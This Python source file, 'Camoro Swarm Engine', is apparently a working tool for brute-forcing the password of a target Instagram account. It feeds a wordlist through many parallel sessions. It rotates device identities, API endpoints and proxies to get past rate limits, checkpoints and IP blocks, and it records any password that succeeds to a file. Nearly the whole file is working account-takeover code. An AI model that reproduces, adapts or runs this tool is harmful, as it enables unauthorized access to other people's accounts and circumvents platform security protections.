#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camoro Swarm Engine
Multi-session links + API/device rotation + optional proxy pool.
"""

from __future__ import annotations

import json
import os
import queue
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime

import requests

from core.api_rotator import APIRotator
from core.banner import (
    Colors,
    show_swarm_banner,
    info,
    success,
    warn,
    error,
    ok,
    fail,
)


@dataclass
class SwarmSession:
    sid: int
    device: object
    session: requests.Session
    csrf: str = ""
    alive: bool = False
    uses: int = 0
    max_uses: int = 12
    proxy: str = None
    last_error: str = ""


class ProxyPool:
    def __init__(self, proxies=None, proxy_file=None):
        self._proxies = []
        if proxies:
            self._proxies.extend(
                [p.strip() for p in proxies if p and str(p).strip()]
            )
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        self._proxies.append(line)
        self._i = 0
        self._lock = threading.Lock()

    def __len__(self):
        return len(self._proxies)

    def next(self):
        if not self._proxies:
            return None
        with self._lock:
            p = self._proxies[self._i % len(self._proxies)]
            self._i += 1
            return p


class SwarmEngine:
    def __init__(
        self,
        username,
        wordlist_path,
        output_dir="output",
        sessions=50,
        workers=20,
        burst_seconds=20.0,
        max_rps=8.0,
        proxy=None,
        proxy_file=None,
        rotate_strategy="round_robin",
        resume=False,
        recycle_every=12,
    ):
        self.username = username.strip().lstrip("@")
        self.wordlist_path = wordlist_path
        self.output_dir = output_dir
        self.sessions_n = max(1, int(sessions))
        self.workers = max(1, int(workers))
        self.burst_seconds = max(1.0, float(burst_seconds))
        self.max_rps = max(0.2, float(max_rps))
        self.rotate_strategy = rotate_strategy
        self.resume = resume
        self.recycle_every = max(3, int(recycle_every))

        self.rotator = APIRotator(strategy=rotate_strategy)
        plist = [proxy] if proxy else []
        self.proxy_pool = ProxyPool(proxies=plist, proxy_file=proxy_file)

        self.passwords = []
        self.start_index = 0
        self.tested = 0
        self.found = None
        self.stop_flag = threading.Event()
        self._lock = threading.Lock()
        self._rate_lock = threading.Lock()
        self._last_request_ts = 0.0
        self._pool = []
        self._pool_q = queue.Queue()

        base = os.path.join(output_dir, self.username)
        os.makedirs(base, exist_ok=True)
        self.progress_file = os.path.join(base, "progress_swarm.json")
        self.result_file = os.path.join(base, "FOUND.txt")
        self.log_file = os.path.join(base, "swarm_log.txt")

    # ── wordlist ──────────────────────────────────────────

    def load_wordlist(self):
        if not os.path.isfile(self.wordlist_path):
            error("Wordlist not found: %s" % self.wordlist_path)
            return False
        with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            self.passwords = [
                ln.strip()
                for ln in f
                if ln.strip() and not ln.startswith("#")
            ]
        if not self.passwords:
            error("Wordlist empty")
            return False
        return True

    # ── progress / resume ─────────────────────────────────

    def _load_progress(self):
        if not self.resume or not os.path.isfile(self.progress_file):
            return
        try:
            with open(self.progress_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            self.start_index = int(data.get("next_index", 0))
            self.tested = int(data.get("tested", 0))
            info("Resume · index %d" % self.start_index)
        except Exception:
            warn("Bad progress file — fresh start")

    def _save_progress(self, index):
        data = {
            "username": self.username,
            "mode": "swarm",
            "next_index": index,
            "tested": self.tested,
            "total": len(self.passwords),
            "found": self.found,
            "updated_at": datetime.utcnow().isoformat() + "Z",
        }
        with open(self.progress_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

    def _log(self, msg):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write("%sZ | %s\n" % (datetime.utcnow().isoformat(), msg))

    # ── rate limiter ──────────────────────────────────────

    def _throttle(self):
        min_gap = 1.0 / self.max_rps
        with self._rate_lock:
            now = time.time()
            wait = self._last_request_ts + min_gap - now
            if wait > 0:
                time.sleep(wait)
            self._last_request_ts = time.time()

    # ── session factory ───────────────────────────────────

    def _build_session(self, sid):
        device = self.rotator.next_identity()
        proxy = self.proxy_pool.next()
        s = requests.Session()
        s.headers.update(device.headers_base())
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        s.cookies.set("mid", device.mid, domain=".instagram.com")
        return SwarmSession(
            sid=sid,
            device=device,
            session=s,
            proxy=proxy,
            max_uses=self.recycle_every,
        )

    def _init_one(self, sw):
        try:
            self._throttle()
            ep = sw.device.endpoint
            r = sw.session.get(ep["home_url"], timeout=20)
            csrf = (
                r.cookies.get("csrftoken")
                or sw.session.cookies.get("csrftoken")
                or ""
            )
            if not csrf:
                m = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', r.text or "")
                if m:
                    csrf = m.group(1)
            if not csrf:
                sw.alive = False
                sw.last_error = "no csrf (%s)" % r.status_code
                return False
            sw.csrf = csrf
            sw.session.headers.update(
                {
                    "X-CSRFToken": csrf,
                    "X-Instagram-AJAX": str(random.randint(1, 9)),
                    "X-IG-App-ID": sw.device.app_id,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": ep["referer"],
                    "Origin": ep["origin"],
                }
            )
            sw.alive = True
            sw.uses = 0
            return True
        except requests.RequestException as exc:
            sw.alive = False
            sw.last_error = str(exc)
            return False

    # ── burst ─────────────────────────────────────────────

    def burst_open_sessions(self):
        info(
            "SWARM burst · opening %d sessions in ~%ss · API rotate=%s"
            % (self.sessions_n, self.burst_seconds, self.rotate_strategy)
        )
        if len(self.proxy_pool) == 0:
            warn(
                "No proxy pool loaded — high burst will burn your IP quickly"
            )
            warn("Use --proxy-file proxies.txt for multi-link stealth")

        pace = self.burst_seconds / max(1, self.sessions_n)
        alive = 0
        t0 = time.time()

        def create_and_init(sid):
            if self.stop_flag.is_set():
                return None
            sw = self._build_session(sid)
            time.sleep(random.uniform(0, min(0.4, pace)))
            if self._init_one(sw):
                return sw
            # retry once with a different endpoint/device
            sw2 = self._build_session(sid)
            sw2.device = self.rotator.rotate_on_block()
            sw2.session = requests.Session()
            sw2.session.headers.update(sw2.device.headers_base())
            if sw2.proxy:
                sw2.session.proxies = {
                    "http": sw2.proxy,
                    "https": sw2.proxy,
                }
            if self._init_one(sw2):
                return sw2
            return None

        factory_workers = min(self.workers, self.sessions_n, 50)
        with ThreadPoolExecutor(max_workers=factory_workers) as ex:
            futs = [
                ex.submit(create_and_init, i)
                for i in range(self.sessions_n)
            ]
            done_n = 0
            for fut in as_completed(futs):
                done_n += 1
                sw = fut.result()
                if sw and sw.alive:
                    self._pool.append(sw)
                    self._pool_q.put(sw)
                    alive += 1
                elapsed = time.time() - t0
                sys.stdout.write(
                    "\r%s[*]%s Sessions alive %d/%d · built %d · %.1fs   "
                    % (
                        Colors.OKCYAN,
                        Colors.ENDC,
                        alive,
                        self.sessions_n,
                        done_n,
                        elapsed,
                    )
                )
                sys.stdout.flush()
        print()
        ok(
            "Swarm ready · %d live links/sessions · APIs=%d"
            % (alive, len(self.rotator.endpoints))
        )
        self._log("BURST_DONE alive=%d" % alive)
        return alive

    # ── recycle / acquire / release ───────────────────────

    def _recycle(self, sw):
        try:
            sw.session.close()
        except Exception:
            pass
        new_sw = self._build_session(sw.sid)
        new_sw.device = self.rotator.rotate_on_block()
        new_sw.session = requests.Session()
        new_sw.session.headers.update(new_sw.device.headers_base())
        proxy = self.proxy_pool.next()
        new_sw.proxy = proxy
        if proxy:
            new_sw.session.proxies = {"http": proxy, "https": proxy}
        self._init_one(new_sw)
        return new_sw

    def _acquire(self):
        while not self.stop_flag.is_set():
            try:
                sw = self._pool_q.get(timeout=2)
            except queue.Empty:
                return None
            if not sw.alive or sw.uses >= sw.max_uses:
                sw = self._recycle(sw)
            if sw.alive:
                return sw
            self._pool_q.put(sw)
            time.sleep(0.05)
        return None

    def _release(self, sw):
        self._pool_q.put(sw)

    # ── login attempt ─────────────────────────────────────

    def _try_login(self, sw, password):
        self._throttle()
        ep = sw.device.endpoint
        ts = int(time.time())

        # كل الـ endpoints الحالية style=web → payload ويب واحد فقط
        payload = {
            "username": self.username,
            "enc_password": "#PWD_INSTAGRAM_BROWSER:0:%d:%s"
            % (ts, password),
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "trustedDeviceRecords": "{}",
        }

        sw.session.headers["X-Instagram-AJAX"] = str(random.randint(1, 99))
        sw.session.headers["X-CSRFToken"] = sw.csrf
        sw.session.headers["X-IG-App-ID"] = sw.device.app_id

        try:
            r = sw.session.post(ep["login_url"], data=payload, timeout=20)
        except requests.RequestException as exc:
            sw.uses += 1
            return {
                "status": "error",
                "password": password,
                "raw": str(exc),
                "sid": sw.sid,
            }

        sw.uses += 1
        new_csrf = r.cookies.get("csrftoken")
        if new_csrf:
            sw.csrf = new_csrf
            sw.session.headers["X-CSRFToken"] = new_csrf

        if r.status_code == 429:
            sw.alive = False
            return {
                "status": "rate_limit",
                "password": password,
                "sid": sw.sid,
                "api": ep["name"],
            }

        try:
            data = r.json()
        except ValueError:
            if r.status_code in (404, 405):
                sw.alive = False
                return {
                    "status": "bad_api",
                    "password": password,
                    "sid": sw.sid,
                    "api": ep["name"],
                }
            return {
                "status": "error",
                "password": password,
                "sid": sw.sid,
                "raw": (r.text or "")[:200],
            }

        # ── success checks ──
        if (
            data.get("authenticated") is True
            or data.get("logged_in_user")
        ):
            return {
                "status": "ok",
                "password": password,
                "sid": sw.sid,
                "api": ep["name"],
            }
        if data.get("two_factor_required"):
            return {
                "status": "two_factor",
                "password": password,
                "sid": sw.sid,
                "api": ep["name"],
            }
        if data.get("checkpoint_url") or data.get("checkpoint_required"):
            sw.alive = False
            return {
                "status": "checkpoint",
                "password": password,
                "sid": sw.sid,
                "api": ep["name"],
            }

        msg = str(data.get("message", "")).lower()
        if "wait" in msg or "rate" in msg:
            sw.alive = False
            return {
                "status": "rate_limit",
                "password": password,
                "sid": sw.sid,
                "api": ep["name"],
            }
        if data.get("spam") or data.get("error_type") == "ip_block":
            sw.alive = False
            return {
                "status": "blocked",
                "password": password,
                "sid": sw.sid,
                "api": ep["name"],
            }
        return {
            "status": "fail",
            "password": password,
            "sid": sw.sid,
            "api": ep["name"],
        }

    # ── progress bar ──────────────────────────────────────

    def _bar(self, idx, total, pwd, rate, eta, api):
        width = 28
        done = int(width * idx / total) if total else 0
        bar = "%s%s" % ("█" * done, "░" * (width - done))
        pct = (100.0 * idx / total) if total else 0.0
        shown = (
            pwd
            if len(pwd) <= 3
            else (pwd[:2] + "*" * (len(pwd) - 3) + pwd[-1])
        )
        sys.stdout.write(
            "\r%s%s%s %s%5.1f%%%s | %d/%d | %s%-14s%s | api:%-10s | %4.2f/s | ETA %ds   "
            % (
                Colors.OKCYAN,
                bar,
                Colors.ENDC,
                Colors.BOLD,
                pct,
                Colors.ENDC,
                idx,
                total,
                Colors.YELLOW,
                shown[:14],
                Colors.ENDC,
                str(api)[:10],
                rate,
                int(max(0, eta)),
            )
        )
        sys.stdout.flush()

    # ── main run ──────────────────────────────────────────

    def run(self):
        show_swarm_banner()
        if not self.load_wordlist():
            return None
        self._load_progress()

        total = len(self.passwords)
        print(
            "  Target        : %s%s%s"
            % (Colors.OKGREEN, self.username, Colors.ENDC)
        )
        print("  Passwords     : %d" % total)
        print("  Start index   : %d" % self.start_index)
        print("  Sessions      : %d" % self.sessions_n)
        print("  Workers       : %d" % self.workers)
        print("  Burst window  : %ss" % self.burst_seconds)
        print("  Max RPS       : %s" % self.max_rps)
        print("  Rotate        : %s" % self.rotate_strategy)
        print(
            "  Proxies       : %s" % (len(self.proxy_pool) or "none")
        )
        print()

        alive = self.burst_open_sessions()
        if alive <= 0:
            error("No live sessions — check network / proxies")
            return None

        info("Starting swarm attack across rotated APIs...")
        print()

        t0 = time.time()
        idx_cursor = [self.start_index]  # قائمة عشان nonlocal
        cursor_lock = threading.Lock()
        found_box = {"pwd": None}

        def worker():
            while (
                not self.stop_flag.is_set() and found_box["pwd"] is None
            ):
                with cursor_lock:
                    if idx_cursor[0] >= total:
                        return
                    i = idx_cursor[0]
                    idx_cursor[0] += 1
                    pwd = self.passwords[i]

                sw = self._acquire()
                if sw is None:
                    time.sleep(0.2)
                    continue

                result = self._try_login(sw, pwd)
                api_name = str(
                    result.get("api")
                    or sw.device.endpoint.get("name", "?")
                )

                with self._lock:
                    self.tested += 1
                    tested_n = self.tested
                    done_i = min(
                        total,
                        max(i + 1, self.start_index + tested_n),
                    )
                    elapsed = max(time.time() - t0, 0.001)
                    rate = tested_n / elapsed
                    left = total - done_i
                    eta = left / rate if rate > 0 else 0
                    self._bar(done_i, total, pwd, rate, eta, api_name)
                    if tested_n % 15 == 0:
                        self._save_progress(idx_cursor[0])

                status = result.get("status")
                if status == "ok":
                    found_box["pwd"] = pwd
                    self.found = pwd
                    self.stop_flag.set()
                    self._write_found(pwd, api_name)
                    self._log(
                        "FOUND | %s | api=%s | sid=%s"
                        % (pwd, api_name, sw.sid)
                    )
                    self._release(sw)
                    return

                if status == "two_factor":
                    found_box["pwd"] = pwd
                    self.found = pwd
                    self.stop_flag.set()
                    self._write_found(pwd, api_name, note="2FA required")
                    self._log("2FA | %s | api=%s" % (pwd, api_name))
                    self._release(sw)
                    return

                if status in (
                    "rate_limit",
                    "blocked",
                    "checkpoint",
                    "bad_api",
                ):
                    sw.alive = False
                    self._log(
                        "%s | api=%s | sid=%s"
                        % (status.upper(), api_name, sw.sid)
                    )
                    sw = self._recycle(sw)

                self._release(sw)

        try:
            with ThreadPoolExecutor(max_workers=self.workers) as ex:
                futs = [ex.submit(worker) for _ in range(self.workers)]
                for fut in as_completed(futs):
                    try:
                        fut.result()
                    except Exception as exc:
                        self._log("worker_exc | %s" % exc)
        except KeyboardInterrupt:
            print()
            warn("Interrupted — saving progress")
            self.stop_flag.set()
            self._save_progress(idx_cursor[0])
            return None
        finally:
            # إغلاق كل الجلسات
            while not self._pool_q.empty():
                try:
                    sw = self._pool_q.get_nowait()
                    try:
                        sw.session.close()
                    except Exception:
                        pass
                except Exception:
                    break

        print()
        self._save_progress(idx_cursor[0])
        if found_box["pwd"]:
            success(
                "PASSWORD FOUND: %s%s%s"
                % (Colors.BOLD, found_box["pwd"], Colors.ENDC)
            )
            return found_box["pwd"]
        fail("Swarm finished — password not in list / blocked")
        return None

    def _write_found(self, password, api, note=""):
        print()
        success("HIT via API `%s`" % api)
        with open(self.result_file, "w", encoding="utf-8") as f:
            f.write("CAMORO SWARM · CREDENTIAL FOUND\n")
            f.write("=" * 42 + "\n")
            f.write("Username : %s\n" % self.username)
            f.write("Password : %s\n" % password)
            f.write("API      : %s\n" % api)
            if note:
                f.write("Note     : %s\n" % note)
            f.write(
                "Time UTC : %sZ\n" % datetime.utcnow().isoformat()
            )
        ok("Saved → %s" % self.result_file)
